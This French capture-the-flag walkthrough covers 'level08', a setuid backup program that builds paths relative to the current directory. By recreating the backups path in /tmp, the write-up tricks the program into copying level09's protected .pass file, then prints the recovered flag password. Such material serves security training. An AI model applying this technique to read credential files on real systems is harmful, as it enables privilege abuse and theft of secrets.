Le level08 est un programme qui permet de faire le backup d'un fichier donné en paramètre. Il y a un dossier backups dans le home du user level08 avec à l'intérieur un fichier caché .log qui nous informe de comment s'est passée la copie.

On teste de lancer le programme avec le path du level09/.pass :

> ./level08 /home/users/level09/.pass

    ERROR: Failed to open ./backups//home/users/level09/.pass

On apprend deux choses :
    - (on le voit deja en faisant un objdump) il y a un strcat de "./backups/" et de argv[1]
    - le programme cherche a ouvrir ./backups/home/users/level09/.pass mais ce path n'existe pas ou du moins aps encore.

Pour résoudre ce problème on va recreer dans tmp le ce Path :

> cd /tmp
> mkdir -p backups/home/users/level09

On voi bien que le programme cherche a ouvrir "./backups..." on doit donc lancer le programme level 8 depuis la dossier ou se trouve notre dossier ./backups donc dans tmp :

> /home/users/level08/level08 /home/users/level09/.pass

> cat /tmp/backups/home/users/level09/.pass
    fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

